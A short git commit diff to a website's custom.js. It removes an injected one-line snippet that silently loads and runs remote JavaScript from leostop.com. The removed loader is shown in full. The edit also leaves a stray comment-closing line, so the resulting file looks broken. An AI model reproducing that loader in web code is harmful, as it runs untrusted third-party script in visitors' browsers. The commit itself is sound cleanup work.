0bd7ee6d0bfe3ab0f8277c7c7bae598d149b8b29
Hajime <63582465+Hajime8673@users.noreply.github.com>
2022-04-02 18:04:29 +0600

    Update custom.js

--- js/custom.js
+++ js/custom.js
@@ -37,11 +37,7 @@ $(function () {
 	});
 	
 	
-	
-     function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-	
-	
-	/* Toggle sidebar
+	 
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      
      $(document).ready(function () {
